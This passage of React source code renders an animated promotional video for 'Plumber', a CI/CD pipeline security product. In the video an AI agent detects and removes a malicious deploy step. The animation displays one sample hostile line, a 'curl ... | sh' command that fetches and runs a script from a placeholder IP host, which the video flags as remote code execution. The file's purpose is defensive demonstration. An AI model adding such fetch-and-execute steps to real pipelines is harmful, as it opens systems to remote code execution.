      <div style={{ padding: '16px 18px', fontFamily: MONO, fontSize: 18, lineHeight: 1.62 }}>
        {lines.map((l, i) => {
          if (l.danger) {
            const ch = collapse;
            return (
              <div key={i} style={{ position: 'relative', margin: '2px -10px', padding: '2px 10px', borderRadius: 6, background: dangerVisible ? `rgba(255,45,61,${0.10 + 0.12 * redPulse})` : 'transparent', boxShadow: dangerVisible ? `inset 3px 0 0 ${C.red}, 0 0 ${18 * redPulse}px ${C.red}44` : 'none', height: ch > 0 ? `${(1 - ch) * 30}px` : 'auto', opacity: 1 - ch, overflow: 'hidden' }}>
                <span style={{ color: C.red, position: 'relative', whiteSpace: 'pre', display: 'block', overflow: 'hidden', textOverflow: 'clip' }}>
                  {'    - curl -s http://185.xx.unknown/p.sh | sh'}
                  <span style={{ position: 'absolute', left: 0, top: '50%', height: 2, background: C.red, width: `${strike * 100}%`, boxShadow: `0 0 8px ${C.red}` }}/>
                </span>
              </div>
            );
          }
          return l.skeleton
            ? <div key={i} style={{ margin: '9px 0', paddingLeft: 40 }}><div style={{ width: `${l.skeleton * 100}%`, maxWidth: 360, height: 13, borderRadius: 7, background: 'rgba(245,245,245,0.13)' }}/></div>
            : <div key={i} style={{ color: l.c, whiteSpace: 'pre', minHeight: 8 }}>{l.txt}</div>;
        })}
      </div>
    </div>
  );
}

/* ───────────────────────── HERO composition (detection → fix) ───────────────────────── */
function HeroFix() {
  const t = TW(useTime());
  if (t < 10.4 || t > 26.2) return null;
  const enter = win(t, 10.5, 11.2, Easing.easeOutBack);
  const exit = win(t, 25.0, 25.6, Easing.easeInCubic);
  const opacity = enter * (1 - exit);

  const tagIn = win(t, 11.2, 11.6, Easing.easeOutBack);
  const tagVisible = t >= 11.2 && t < 23.3;
  // exfil red filet (screen space) — escapes RIGHTWARD from the clicked red node, frozen by the gate before the edge
  const filetGrow = win(t, 11.3, 12.7, Easing.easeOutCubic);
  const filetRetract = win(t, 22.9, 23.5, Easing.easeInCubic);
  const filetStartX = HERO.hx; // the clicked red node (fixed on screen under the zoom)
  const barX = 1560;
  const filetEndX = lerp(lerp(filetStartX, barX, filetGrow), filetStartX, filetRetract);
  const filetY = heroScreenYFn(t);
  const filetFrozen = t >= 12.78 && t < 22.9;
  // green barrier gate dropping across the pipe
  const barDrop = win(t, 12.4, 12.78, Easing.easeInQuad);
  const barUp = win(t, 23.0, 23.55, Easing.easeInCubic);
  const barTransY = lerp(-380, 0, barDrop) + lerp(0, -380, barUp);
  const barFlash = win(t, 12.66, 12.98);
  const barOpacity = barDrop * (1 - barUp);
  const blocked = t >= 12.8 && t < 23.2;
  const secure = t >= 23.3;
  const secureIn = win(t, 23.3, 23.8, Easing.easeOutBack);
  const scoreT = win(t, 22.8, 23.9, Easing.easeInOutCubic);
  const scoreGrade = scoreT < 0.25 ? 'E' : scoreT < 0.5 ? 'D' : scoreT < 0.7 ? 'C' : scoreT < 0.9 ? 'B' : 'A';

  const agentIn = win(t, 15.2, 15.9, Easing.easeOutCubic);
  const agentMove = win(t, 15.9, 17.6, Easing.easeInOutCubic);
  const agentX = lerp(-220, 0, agentMove);
  const agentY = lerp(120, 0, agentMove);
  const agentVisible = t >= 15.2 && t < 23.4;
  const agentFade = win(t, 23.0, 23.4, Easing.easeInCubic);

  const kIn = win(t, 18.0, 19.4, Easing.easeOutCubic);
  const orgHi = win(t, 19.5, 20.2, Easing.easeOutCubic);
  const matchHi = win(t, 20.0, 20.8, Easing.easeOutCubic);
  const thread = win(t, 20.2, 21.0, Easing.easeOutCubic);
  const kVisible = t >= 17.9 && t < 23.4;
  const kFade = win(t, 23.0, 23.5, Easing.easeInCubic);

  const termIn = win(t, 20.8, 21.3, Easing.easeOutBack);
  const typeP = win(t, 21.1, 22.0, Easing.linear);
  const validIn = win(t, 22.3, 22.7, Easing.easeOutBack);
  const termVisible = t >= 20.8 && t < 26.0;

  const mrIn = win(t, 23.4, 24.0, Easing.easeOutBack);
  const mrVisible = t >= 23.4;

  const cmd = '$ plumber analyze .gitlab-ci.yml';
  const shownCmd = cmd.slice(0, Math.round(cmd.length * typeP));

  return (
    <div style={{ position: 'absolute', inset: 0, opacity, pointerEvents: 'none' }}>
      <div style={{ position: 'absolute', left: '50%', top: 440, transform: `translateX(-50%) scale(${0.7 + 0.3 * enter})`, transformOrigin: 'top center' }}>
        <div style={{ position: 'relative' }}>
          {/* validation beam — emanates straight down from the malicious line, hidden BEHIND the panel */}
          {thread > 0.02 && t < 23.4 && (
            <div style={{ position: 'absolute', left: '50%', top: 187, width: 2, height: lerp(0, 430, thread), transform: 'translateX(-50%)', background: `linear-gradient(180deg, ${C.greenBright}, ${C.green}00)`, opacity: 0.65 * (1 - kFade), boxShadow: `0 0 10px ${C.green}` }}/>
          )}
          <YamlPanel />
          {/* Minimal score — just the coloured grade letter, to the LEFT of the panel; sweeps E→A when fixed */}
          {t >= 10.6 && (
            <div style={{ position: 'absolute', right: '100%', top: 70, marginRight: 46, opacity: enter, transform: `scale(${0.92 + 0.08 * enter + 0.04 * Math.sin(t * 7) * (scoreT > 0.02 && scoreT < 1 ? 1 : 0)})`, transformOrigin: 'center top' }}>
              <ScoreLetter grade={scoreGrade} size={170} />
            </div>
          )}
          {tagVisible && (
            <div style={{ position: 'absolute', right: -16, top: 170, transform: `translateX(100%) scale(${tagIn})`, transformOrigin: 'left center', display: 'flex', alignItems: 'center', gap: 8, padding: '8px 14px', background: C.red, borderRadius: 8, fontFamily: MONO, fontSize: 15, fontWeight: 700, color: '#fff', whiteSpace: 'nowrap', boxShadow: `0 0 24px ${C.red}88`, opacity: Math.min(tagIn, 1 - win(t, 22.6, 23.2)) }}>
              ⚠ malicious · remote code execution
            </div>
          )}
          {agentVisible && (
            <div style={{ position: 'absolute', left: '50%', top: 187, marginLeft: -23, marginTop: -23, transform: `translate(${agentX}px, ${agentY}px)`, opacity: agentIn * (1 - agentFade) }}>
              <AgentOrb t={t} />
            </div>
          )}
          {/* SECURE chip — pinned INSIDE the .gitlab-ci.yml card, top-right, with a pulsing ring */}
          {secure && (
            <div style={{ position: 'absolute', right: 18, top: 18, display: 'flex', alignItems: 'center', gap: 9, padding: '8px 15px 8px 13px', borderRadius: 9, background: 'rgba(4,20,10,0.92)', border: `1.5px solid ${C.green}`, color: C.greenBright, fontFamily: MONO, fontWeight: 700, fontSize: 15, letterSpacing: '0.12em', transform: `scale(${secureIn})`, transformOrigin: 'right top', boxShadow: `0 0 24px ${C.green}55` }}>
              <span style={{ position: 'relative', width: 10, height: 10, display: 'inline-flex', alignItems: 'center', justifyContent: 'center' }}>
                <span style={{ position: 'absolute', width: 10, height: 10, borderRadius: '50%', border: `2px solid ${C.green}`, opacity: (1 - (0.5 + 0.5 * Math.sin(t * 4))) * secureIn, transform: `scale(${1 + 1.6 * (0.5 + 0.5 * Math.sin(t * 4))})` }}/>
                <span style={{ width: 7, height: 7, borderRadius: '50%', background: C.greenBright, boxShadow: `0 0 8px ${C.green}` }}/>
              </span>
              SECURE
            </div>
          )}
        </div>
      </div>

      {/* exfil red filet (screen space) — escapes rightward FROM the clicked red node, on top of the pipeline, frozen by the gate */}
      {filetGrow > 0.01 && filetRetract < 0.99 && (
        <div style={{ position: 'absolute', left: filetStartX, top: filetY - 2, width: Math.max(0, filetEndX - filetStartX), height: 4, background: `linear-gradient(90deg, ${C.red} 0%, ${C.red} 72%, ${C.red}cc)`, boxShadow: `0 0 18px 2px ${C.red}`, borderRadius: 2 }}>
          <div style={{ position: 'absolute', right: -6, top: -4, width: 12, height: 12, borderRadius: '50%', background: C.red, boxShadow: `0 0 16px 4px ${C.red}`, opacity: filetFrozen ? 0.95 : 0.85 }}/>
          {[0, 1, 2].map(k => { const ph = filetFrozen ? [0.25, 0.55, 0.82][k] : (((t * 0.7) + k * 0.3) % 1); const dy = filetFrozen ? 8 : lerp(0, 22, ((t * 0.9) + k * 0.33) % 1); const dop = filetFrozen ? 0.9 : 0.55; return <div key={k} style={{ position: 'absolute', left: `${ph * 100}%`, top: dy, width: 6, height: 8, borderRadius: '50%', background: C.red, opacity: dop }}/>; })}
        </div>
      )}
      {/* green barrier gate falling across the pipe */}
      {barOpacity > 0.01 && (
        <div style={{ position: 'absolute', left: barX - 3.5, top: filetY - 155, width: 7, height: 310, transform: `translateY(${barTransY}px)`, background: `linear-gradient(180deg, ${C.green}00, ${C.greenBright} 30%, ${C.greenBright} 70%, ${C.green}00)`, boxShadow: `0 0 30px 7px ${C.green}aa`, borderRadius: 4, opacity: barOpacity }}/>
      )}
      {barFlash > 0 && barFlash < 1 && barUp < 0.5 && (
        <div style={{ position: 'absolute', left: barX, top: filetY, width: 24 + barFlash * 90, height: 24 + barFlash * 90, marginLeft: -(12 + barFlash * 45), marginTop: -(12 + barFlash * 45), borderRadius: '50%', border: `2.5px solid ${C.greenBright}`, opacity: (1 - barFlash) * 0.95 }}/>
      )}
      {/* "PIPELINE BLOCKED by Plumber" — green (a good thing), pinned to the gate that does the blocking, with a connector line down to it */}
      {blocked && (
        <div style={{ position: 'absolute', left: barX, top: filetY - 150, transform: `translate(-50%, 0) scale(${barDrop})`, transformOrigin: 'center bottom' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 11, padding: '11px 18px 11px 13px', borderRadius: 12, background: '#04140a', border: `1.6px solid ${C.green}`, boxShadow: `0 0 30px ${C.green}66, inset 0 1px 0 rgba(255,255,255,0.06)`, whiteSpace: 'nowrap' }}>
            <PlumberMark size={30} />
            <div style={{ display: 'flex', flexDirection: 'column', gap: 2, lineHeight: 1.05 }}>
              <span style={{ fontFamily: MONO, fontWeight: 700, fontSize: 17, letterSpacing: '0.1em', color: C.greenBright }}>PIPELINE BLOCKED</span>
              <span style={{ fontFamily: MONO, fontSize: 11.5, letterSpacing: '0.16em', color: 'rgba(59,255,106,0.62)' }}>BY PLUMBER</span>
            </div>
          </div>
          {/* connector line from the badge down to the gate */}
          <div style={{ position: 'absolute', left: '50%', top: '100%', width: 2, height: 90, transform: 'translateX(-50%)', background: `linear-gradient(180deg, ${C.green}, ${C.green}33)` }}/>
          <div style={{ position: 'absolute', left: '50%', top: 'calc(100% + 90px)', width: 8, height: 8, borderRadius: '50%', transform: 'translate(-50%,-50%)', background: C.greenBright, boxShadow: `0 0 12px ${C.green}` }}/>
        </div>
      )}

      {/* Merged card: Plumber Oracle validation + the resulting MR, one place, main info only */}
      {termVisible && (
        <div style={{ position: 'absolute', left: '50%', bottom: 200, transform: `translateX(-50%) scale(${termIn})`, transformOrigin: 'bottom center', width: 660, background: 'rgba(6,9,10,0.97)', border: '1px solid rgba(0,224,0,0.32)', borderRadius: 14, boxShadow: `0 24px 70px rgba(0,0,0,0.62), 0 0 34px ${C.green}22`, overflow: 'hidden' }}>
          {/* Oracle validation */}
          <div style={{ padding: '16px 20px 15px' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8, marginBottom: 12 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 9, color: C.ink, fontFamily: MONO, fontSize: 13, fontWeight: 700, letterSpacing: '0.1em' }}><PlumberMark size={20} /> PLUMBER ORACLE</div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8, opacity: validIn }}>
                <span style={{ fontFamily: MONO, fontSize: 12, letterSpacing: '0.12em', color: C.dim }}>SCORE</span>
                <GradeChip g="A" size={20} />
              </div>
            </div>
            <div style={{ fontFamily: MONO, fontSize: 16, color: C.ink }}>{shownCmd}<span style={{ opacity: (typeP < 1 && Math.floor(t * 2) % 2) ? 1 : 0 }}>▋</span></div>
            {validIn > 0.02 && (
              <div style={{ marginTop: 10, fontFamily: MONO, fontSize: 16, color: C.green, fontWeight: 700, opacity: validIn, transform: `translateY(${(1 - validIn) * 6}px)` }}>✓ valid</div>
            )}
          </div>
          {/* MR footer */}
          {mrVisible && (
            <div style={{ display: 'flex', alignItems: 'center', gap: 16, padding: '14px 20px', borderTop: `1px solid ${C.green}26`, background: 'rgba(0,224,0,0.05)', opacity: mrIn, transform: `translateY(${(1 - mrIn) * 8}px)` }}>
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontFamily: MONO, fontSize: 12, color: C.dim, marginBottom: 3 }}>!247 · plumber/fix</div>
                <div style={{ fontFamily: DISP, fontWeight: 600, fontSize: 18, color: C.ink, whiteSpace: 'nowrap' }}>Remove malicious deploy step</div>
              </div>
              <div style={{ padding: '10px 22px', borderRadius: 9, background: C.green, color: '#001a00', fontFamily: DISP, fontWeight: 700, fontSize: 15, whiteSpace: 'nowrap', boxShadow: `0 0 20px ${C.green}66` }}>Ready to merge</div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

function AgentOrb({ t }) {
  const spin = (t * 60) % 360;
  return (
    <div style={{ position: 'relative', width: 46, height: 46 }}>
      <div style={{ position: 'absolute', inset: 0, borderRadius: '50%', background: `radial-gradient(circle at 35% 30%, ${C.greenBright}, ${C.green} 55%, ${C.greenDeep})`, boxShadow: `0 0 24px 6px ${C.green}aa` }}/>
      <div style={{ position: 'absolute', inset: -7, borderRadius: '50%', border: `1.5px solid ${C.green}66`, borderTopColor: C.greenBright, transform: `rotate(${spin}deg)` }}/>
      <div style={{ position: 'absolute', inset: 14, borderRadius: '50%', background: 'rgba(255,255,255,0.9)', filter: 'blur(1px)' }}/>
    </div>
  );
}

function KnowledgeGraph({ progress, orgHi, t, matchHi = 0 }) {
  // The agent reasons over a base of CI/CD security rules. The org-tuned subset is brighter
  // (the moat: tailored, not generic), and the rule matching the detected threat lights up.
  const rules = [
    { x: 96, y: 60, label: 'supply-chain', org: false },
    { x: 250, y: 40, label: 'secret-leak', org: true },
    { x: 410, y: 32, label: 'unpinned-deps', org: true },
    { x: 566, y: 52, label: 'shell-inject', org: true },
    { x: 392, y: 110, label: 'remote-code-exec', org: true, match: true },
    { x: 672, y: 96, label: 'cache-poison', org: false },
  ];
  const dots = [[58,98],[176,116],[330,78],[486,108],[620,30],[706,70],[86,32],[700,124],[214,86],[540,120]];
  const edges = [[0, 1], [1, 2], [2, 3], [3, 5], [1, 4], [2, 4], [3, 4]];
  const mp = clamp(matchHi, 0, 1);
  const mPulse = 0.5 + 0.5 * Math.sin(t * 5);
  return (
    <svg viewBox="0 0 760 150" style={{ width: '100%', height: '100%', overflow: 'visible' }}>
      {/* ambient knowledge */}
      {dots.map(([x, y], i) => <circle key={'d' + i} cx={x} cy={y} r={2.2} fill={C.green} opacity={progress * 0.22} />)}
      {/* edges — org links brighten; links into the matched rule light up */}
      {edges.map(([a, b], i) => {
        const toMatch = rules[a].match || rules[b].match;
        const both = rules[a].org && rules[b].org;
        return <line key={i} x1={rules[a].x} y1={rules[a].y} x2={rules[b].x} y2={rules[b].y} stroke={C.greenBright} strokeWidth={toMatch ? 1.2 + 1.6 * mp : both ? 1.5 : 1} opacity={progress * (toMatch ? 0.25 + 0.6 * mp : both ? 0.3 + 0.55 * orgHi : 0.32)} />;
      })}
      {/* beam from the matched rule down toward the fix below */}
      {mp > 0.05 && <line x1={rules[4].x} y1={rules[4].y + 8} x2={rules[4].x} y2={158} stroke={C.greenBright} strokeWidth={1.5 + mp} opacity={mp * 0.55} />}
      {/* rule nodes + labels */}
      {rules.map((n, i) => {
        const hi = n.match ? mp : (n.org ? orgHi : 0);
        const rad = n.match ? 7 : (n.org ? 5.5 : 4.5);
        return (
          <g key={i}>
            {n.match && mp > 0.02 && <circle cx={n.x} cy={n.y} r={rad + 4 + mPulse * 8 * mp} fill="none" stroke={C.greenBright} strokeWidth="1.6" opacity={mp * (1 - mPulse * 0.5)} />}
            <circle cx={n.x} cy={n.y} r={rad * (0.6 + 0.4 * progress)} fill={C.greenBright} opacity={progress * (0.4 + 0.55 * (n.match ? mp : (n.org ? (0.4 + 0.6 * orgHi) : 0.45)))} style={{ filter: hi > 0 ? `drop-shadow(0 0 ${7 * hi}px ${C.green})` : 'none' }} />
            <text x={n.x} y={n.y < 72 ? n.y - 11 : n.y - 13} textAnchor="middle" fontFamily={MONO} fontWeight={n.match ? 700 : 400} fontSize={n.match ? 12.5 : 11} fill={n.match ? C.greenBright : (n.org ? 'rgba(59,255,106,0.82)' : 'rgba(0,224,0,0.5)')} opacity={progress * (n.match ? (0.4 + 0.6 * mp) : (n.org ? (0.45 + 0.55 * orgHi) : 0.42))}>{n.label}</text>
          </g>
        );
      })}
      {/* matched callout */}
      {mp > 0.05 && (
        <foreignObject x={rules[4].x - 66} y={rules[4].y + 16} width="132" height="26" style={{ overflow: 'visible' }}>
          <div style={{ opacity: mp, display: 'inline-flex', alignItems: 'center', gap: 6, padding: '2px 10px', background: C.green, color: '#001a00', borderRadius: 6, fontFamily: MONO, fontSize: 11, fontWeight: 700, whiteSpace: 'nowrap' }}>✓ threat pattern matched</div>
        </foreignObject>
      )}
      {/* your-org model badge over the org cluster */}
      <foreignObject x="270" y="-34" width="240" height="30" style={{ overflow: 'visible' }}>
        <div style={{ opacity: orgHi, display: 'inline-flex', alignItems: 'center', gap: 7, padding: '4px 12px', background: 'rgba(0,224,0,0.14)', border: `1px solid ${C.green}`, borderRadius: 20, fontFamily: MONO, fontSize: 13, color: C.greenBright, whiteSpace: 'nowrap' }}>★ your-org model</div>
      </foreignObject>
    </svg>
  );
}

/* ───────────────────────── Final recap + signature ───────────────────────── */
function FinalRecap() {
  const t = TW(useTime());
  if (t < 30.4 || t > 33.2) return null;
  const items = ['Threats removed', 'Every pipeline secure', 'Plumber Score: A everywhere'];
  const exit = win(t, 32.8, 33.2, Easing.easeInCubic);
  return (
    <div style={{ position: 'absolute', left: '50%', top: 348, transform: 'translateX(-50%)', opacity: 1 - exit, padding: '40px 56px', borderRadius: 24, background: 'rgba(7,8,9,0.5)', backdropFilter: 'blur(16px)', WebkitBackdropFilter: 'blur(16px)', border: '1px solid rgba(255,255,255,0.06)', boxShadow: '0 10px 60px rgba(0,0,0,0.45)', display: 'flex', flexDirection: 'column', gap: 16 }}>
      {items.map((s, i) => {
        const p = win(t, 30.9 + i * 0.4, 31.4 + i * 0.4, Easing.easeOutBack);
        return (
          <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 18, opacity: p, transform: `translateX(${(1 - p) * -26}px)` }}>
            <span style={{ width: 40, height: 40, borderRadius: 20, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(0,224,0,0.16)', border: `2px solid ${C.green}`, color: C.green, fontSize: 20, fontWeight: 700, boxShadow: `0 0 18px ${C.green}55` }}>✓</span>
            <span style={{ fontFamily: DISP, fontWeight: 600, fontSize: 40, color: C.ink, letterSpacing: '-0.01em', display: 'inline-block', whiteSpace: 'nowrap' }}>{i === 2 ? (<>Plumber Score: <GradeChip g="A" size={30} /> everywhere</>) : s}</span>
          </div>
        );
      })}
    </div>
  );
}

function Signature() {
  const t = TW(useTime());
  if (t < 32.9) return null;
  const inP = win(t, 33.0, 33.7, Easing.easeOutCubic);
  const pulse = 0.5 + 0.5 * Math.sin((t - 33) * 3);
  return (
    <div style={{ position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', opacity: inP, background: 'radial-gradient(60% 60% at 50% 45%, rgba(0,60,24,0.35), rgba(7,8,9,0.96))' }}>
      <PlumberWordmark width={520} />
      <div style={{ marginTop: 40, fontFamily: DISP, fontWeight: 500, fontSize: 38, color: C.ink, letterSpacing: '-0.01em', transform: `translateY(${(1 - win(t, 33.3, 33.9)) * 14}px)`, opacity: win(t, 33.3, 33.9) }}>Security without effort.</div>
    </div>
  );
}

// Full Plumber wordmark + circular mark from the brand SVG
function PlumberWordmark({ width = 520 }) {
  const ratio = 203 / 756;
  return (
    <svg width={width} height={width * ratio} viewBox="0 0 756 203" fill="none" style={{ filter: `drop-shadow(0 0 30px ${C.green}44)` }}>
      <path d="M256.4 137.68V60.4H269.14V47.66H308.62V60.4H321.5V99.6H308.62V112.34H270.54V137.68H256.4ZM270.54 98.2H307.22V61.8H270.54V98.2ZM330.097 137.68V47.66H344.237V137.68H330.097ZM365.538 137.68V125.08H352.798V73H366.938V123.68H403.618V73H417.898V125.08H405.018V137.68H365.538ZM429.229 137.68V73H468.849V85.74H480.049V73H507.069V85.74H519.669V137.68H505.669V87H481.449V137.68H467.449V87H443.369V137.68H429.229ZM540.959 137.68V125.08H528.219V47.66H542.359V73H580.439V85.74H593.319V125.08H580.439V137.68H540.959ZM542.359 123.68H579.039V87H542.359V123.68ZM614.656 137.68V125.08H601.916V85.74H614.656V73H654.136V85.74H667.016V99.6H652.736V87H616.056V98.2H641.536V112.34H616.056V123.68H652.736V110.8H667.016V124.94H654.136V137.68H614.656ZM678.347 137.68V85.74H691.087V73H730.567V85.74H743.447V99.6H729.167V87H692.487V137.68H678.347Z" fill="#F5F5F5"/>
      <g clipPath="url(#wmClip)">
        <line y1="45.18" x2="202.723" y2="45.18" stroke="#00D400" strokeWidth="11"/><line y1="55.32" x2="202.723" y2="55.32" stroke="#00D400" strokeWidth="11"/><line y1="35.04" x2="202.723" y2="35.04" stroke="#00DF00" strokeWidth="11"/><line y1="24.91" x2="202.723" y2="24.91" stroke="#00DF00" strokeWidth="11"/><line y1="14.77" x2="202.723" y2="14.77" stroke="#00EA00" strokeWidth="11"/><line y1="4.64" x2="202.723" y2="4.64" stroke="#00EA00" strokeWidth="11"/><line y1="65.45" x2="202.723" y2="65.45" stroke="#00C900" strokeWidth="11"/><line y1="75.59" x2="202.723" y2="75.59" stroke="#00C900" strokeWidth="11"/><line y1="85.73" x2="202.723" y2="85.73" stroke="#00BE00" strokeWidth="11"/><line y1="95.86" x2="202.723" y2="95.86" stroke="#00BE00" strokeWidth="11"/><line y1="106.0" x2="202.723" y2="106.0" stroke="#00B300" strokeWidth="11"/><line y1="116.13" x2="202.723" y2="116.13" stroke="#00B300" strokeWidth="11"/><line y1="126.27" x2="202.723" y2="126.27" stroke="#00A800" strokeWidth="11"/><line y1="136.41" x2="202.723" y2="136.41" stroke="#00A800" strokeWidth="11"/><line y1="146.54" x2="202.723" y2="146.54" stroke="#009D00" strokeWidth="11"/><line y1="156.68" x2="202.723" y2="156.68" stroke="#009D00" strokeWidth="11"/><line y1="166.82" x2="202.723" y2="166.82" stroke="#009200" strokeWidth="11"/><line y1="176.95" x2="202.723" y2="176.95" stroke="#009200" strokeWidth="11"/><line y1="187.09" x2="202.723" y2="187.09" stroke="#008700" strokeWidth="11"/><line y1="197.23" x2="202.723" y2="197.23" stroke="#008700" strokeWidth="11"/>
        <path d="M157 101H133.215V92.5703H93.5723V132.213H101V156H46V132.213H53.9287V68.7842H61.8564V60.8584H69.7852V52.9297H77.7139V52.9287H133.214V45H157V101ZM77.7139 45.001H53.9287V45H77.7139V45.001Z" fill="#F5F5F5"/>
      </g>
      <defs><clipPath id="wmClip"><rect width="202.723" height="202.723" rx="101.362"/></clipPath></defs>
    </svg>
  );
}

// Just the circular Plumber mark (the gradient-bars disc), for inline badges
function PlumberMark({ size = 26 }) {
  return (
    <svg width={size} height={size} viewBox="0 0 203 203" fill="none" style={{ display: 'block' }}>
      <g clipPath="url(#pmClip)">
        <line y1="45.18" x2="202.723" y2="45.18" stroke="#00D400" strokeWidth="11"/><line y1="55.32" x2="202.723" y2="55.32" stroke="#00D400" strokeWidth="11"/><line y1="35.04" x2="202.723" y2="35.04" stroke="#00DF00" strokeWidth="11"/><line y1="24.91" x2="202.723" y2="24.91" stroke="#00DF00" strokeWidth="11"/><line y1="14.77" x2="202.723" y2="14.77" stroke="#00EA00" strokeWidth="11"/><line y1="4.64" x2="202.723" y2="4.64" stroke="#00EA00" strokeWidth="11"/><line y1="65.45" x2="202.723" y2="65.45" stroke="#00C900" strokeWidth="11"/><line y1="75.59" x2="202.723" y2="75.59" stroke="#00C900" strokeWidth="11"/><line y1="85.73" x2="202.723" y2="85.73" stroke="#00BE00" strokeWidth="11"/><line y1="95.86" x2="202.723" y2="95.86" stroke="#00BE00" strokeWidth="11"/><line y1="106.0" x2="202.723" y2="106.0" stroke="#00B300" strokeWidth="11"/><line y1="116.13" x2="202.723" y2="116.13" stroke="#00B300" strokeWidth="11"/><line y1="126.27" x2="202.723" y2="126.27" stroke="#00A800" strokeWidth="11"/><line y1="136.41" x2="202.723" y2="136.41" stroke="#00A800" strokeWidth="11"/><line y1="146.54" x2="202.723" y2="146.54" stroke="#009D00" strokeWidth="11"/><line y1="156.68" x2="202.723" y2="156.68" stroke="#009D00" strokeWidth="11"/><line y1="166.82" x2="202.723" y2="166.82" stroke="#009200" strokeWidth="11"/><line y1="176.95" x2="202.723" y2="176.95" stroke="#009200" strokeWidth="11"/><line y1="187.09" x2="202.723" y2="187.09" stroke="#008700" strokeWidth="11"/><line y1="197.23" x2="202.723" y2="197.23" stroke="#008700" strokeWidth="11"/>
        <path d="M157 101H133.215V92.5703H93.5723V132.213H101V156H46V132.213H53.9287V68.7842H61.8564V60.8584H69.7852V52.9297H77.7139V52.9287H133.214V45H157V101ZM77.7139 45.001H53.9287V45H77.7139V45.001Z" fill="#F5F5F5"/>
      </g>
      <defs><clipPath id="pmClip"><rect width="202.723" height="202.723" rx="101.362"/></clipPath></defs>
    </svg>
  );
}

/* ───────────────────────── Scene root ───────────────────────── */
function Scene() {
  const t = TW(useTime());
  // camera: pull back (origin center) → at t=8.5 scale 1 → zoom into hero (origin hero point) → pull back out
  const camScale = camZoomFn(t);
  const camShiftY = camShiftYFn(t);
  const camOrigin = t < 8.5 ? 'center center' : `${HERO.hx}px ${HERO.hy}px`;
  const introLift = win(t, 0.2, 2.2, Easing.easeOutCubic);

  // beat 2 wordmark
  const wmVisible = t >= 4.7 && t < 7.6;
  const wmIn = win(t, 4.7, 5.2, Easing.easeOutCubic);
  const wmOut = win(t, 7.1, 7.6, Easing.easeInCubic);
  const wmPulse = 0.5 + 0.5 * Math.sin((t - 4.7) * 5);

  return (
    <div style={{ position: 'absolute', inset: 0, background: C.bg, overflow: 'hidden' }}>
      {/* WORLD */}
      <div style={{ position: 'absolute', inset: 0, transform: `translateY(${camShiftY}px) scale(${camScale})`, transformOrigin: camOrigin }}>
        <Network />
      </div>

      {/* intro darkness lift */}
      <div style={{ position: 'absolute', inset: 0, background: '#070809', opacity: 1 - introLift, pointerEvents: 'none' }}/>

      {/* beat 2: full wordmark spotting vulnerabilities */}
      {wmVisible && (
        <div style={{ position: 'absolute', left: '50%', top: 150, transform: `translateX(-50%) scale(${0.95 + wmPulse * 0.04})`, opacity: wmIn * (1 - wmOut), filter: `drop-shadow(0 0 ${30 + wmPulse * 40}px ${C.green}66)` }}>
          <PlumberWordmark width={460} />
        </div>
      )}

      {/* HERO + cursor live in screen space; hero node stays fixed under the zoom (origin = hero point) */}
      <Cursor t={t} />
      <HeroFix />

      {/* caption legibility gradient */}
      <div style={{ position: 'absolute', left: 0, right: 0, bottom: 0, height: 360, background: 'linear-gradient(0deg, rgba(7,8,9,0.85), transparent)', pointerEvents: 'none' }}/>

      <FinalRecap />
      <Signature />

      {/* CAPTIONS */}
      <Caption start={0.3} end={4.7}><Line text="Your pipelines are leaking." /><Line text="You just can't see it." /></Caption>
      <Caption start={4.8} end={7.2}><Line text="Plumber maps every pipeline. Continuously." size={50} /></Caption>
      <Caption start={7.4} end={9.6}><div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', flexWrap: 'wrap', gap: 14, fontFamily: DISP, fontWeight: 600, fontSize: 46, color: C.ink, letterSpacing: '-0.02em', textShadow: '0 2px 30px rgba(0,0,0,0.85)' }}><span>Every pipeline gets a Plumber Score, from</span><GradeChip g="A" size={38} /><span>to</span><GradeChip g="E" size={38} /></div></Caption>
      <Caption start={10.0} end={12.7}><Line text="A malicious script." /><Line text="Pulling code from an unknown source." size={44} /></Caption>
      <Caption start={13.2} end={15.0}><Line text="Plumber blocks the pipeline before it runs." size={48} /></Caption>
      <Caption start={15.2} end={18.0}><Line text="An autonomous agent gets to work." size={50} /></Caption>
      <Caption start={18.0} end={20.9}><Line text="Expert CI/CD knowledge, modeled for your org." size={46} /></Caption>
      <Caption start={25.6} end={28.1}><Line text="The threat removed, validated live by our deterministic Oracle." size={38} /></Caption>
      <Caption start={28.3} end={30.3}><div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 18, fontFamily: DISP, fontWeight: 600, fontSize: 60, color: C.ink, letterSpacing: '-0.02em', textShadow: '0 2px 30px rgba(0,0,0,0.85)' }}><span>Every pipeline back to an</span><span style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', minWidth: 66, height: 66, padding: '0 8px', borderRadius: 16, background: C.green, color: '#00140a', fontFamily: DISP, fontWeight: 800, fontSize: 50, lineHeight: 1, boxShadow: `0 0 30px ${C.green}66, inset 0 1px 0 rgba(255,255,255,0.25)`, transform: 'translateY(-3px)' }}>A</span></div></Caption>
    </div>
  );
}

function PlumberVideo({ controls = false, loop = true, autoplay = true }) {
  return <Stage width={1920} height={1080} duration={40} background={C.bg} persistKey="plumber-video" controls={controls} loop={loop} autoplay={autoplay}><Scene /></Stage>;
}

export default PlumberVideo;
export { PlumberVideo };
